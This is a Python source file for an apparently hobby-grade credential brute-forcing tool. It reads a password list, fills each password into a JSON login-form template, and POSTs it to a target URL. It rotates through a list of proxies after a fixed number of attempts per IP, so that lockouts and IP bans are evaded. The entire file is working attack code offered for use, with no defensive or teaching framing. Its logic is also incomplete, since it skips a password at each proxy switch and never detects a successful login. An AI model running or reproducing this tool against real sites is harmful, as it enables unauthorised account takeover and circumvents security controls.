import argparse
import sys, json, os
from packages.utils import collect_input_args, validate_input_args
import urllib.request, urllib.error, urllib.response, urllib.parse


class Bruteforcer:
    def __init__(self, mode, url, form_scheme, proxies, attemps_per_ip) -> None:
        self.mode = mode
        self.url = url
        self.form_scheme = form_scheme
        self.proxies = proxies
        self.attemps_per_ip = attemps_per_ip
        # self.url = get_url()
        # self.logins_list = get_logins_list()
        # self.passwords_list = get_password_list()
        pass

    def proxy_rotating_attack(self, index, data_bytes):
        proxy_handler = urllib.request.ProxyHandler(
            {"http": self.proxies[index], "https": self.proxies[index]}
        )
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [("User-agent", "Mozilla/5.0")]
        urllib.request.install_opener(opener)
        request = urllib.request.Request(self.url, data=data_bytes)
        with urllib.request.urlopen(request, timeout=10) as response:
            print(response.status)


class BruteforceMode(Bruteforcer):
    def __init__(
        self, mode, url, form_scheme, login, passwords_file, proxies, attemps_per_ip
    ) -> None:
        super().__init__(mode, url, form_scheme, proxies, attemps_per_ip)
        self.login = login
        with open(passwords_file) as f:
            self.passwords_list = [line.rstrip() for line in f]

        with open(proxies) as f:
            self.proxies = [line.rstrip() for line in f]

    def perform_bruteforce(self):
        counter = 0
        index = 0
        if self.attemps_per_ip * len(self.proxies) < len(self.passwords_list):
            print(
                f"It's too much answers (`{len(self.passwords_list)}`) to check for `{len(self.proxies)}` IPs! Incease the number of attemps per one IP or decrease the number of answers"
            )
        else:
            for password in self.passwords_list:
                if counter < self.attemps_per_ip:
                    fileObj = open(self.form_scheme)
                    jsonDict = json.load(fileObj)
                    for key in jsonDict:
                        if type(jsonDict[key]) == str:
                            if "$" in jsonDict[key]:
                                jsonDict[key] = os.path.expandvars(
                                    os.getenv(key, password)
                                )
                        elif type(jsonDict[key]) == list:
                            if "$" in jsonDict[key][0]:
                                jsonDict[key][0] = os.path.expandvars(
                                    os.getenv(key[0], password)
                                )
                        else:
                            pass
                    data_bytes = str.encode(json.dumps(jsonDict))
                    print(f"IP: {self.proxies[index]}, Data: {json.dumps(jsonDict)}")
                    super().proxy_rotating_attack(index, data_bytes)
                    # jeśli się uda to git
                    # jeśli nie to zmień IP na następny
                    counter = counter + 1
                else:
                    index = index + 1
                    counter = 0


parser = argparse.ArgumentParser()
args = collect_input_args(parser)
validate_input_args(args)

bruteforce_tool = BruteforceMode(
    args.mode,
    args.url,
    args.form_scheme,
    args.Login,
    args.passwords_list,
    args.proxies,
    args.attemps_per_ip,
)
bruteforce_tool.perform_bruteforce()
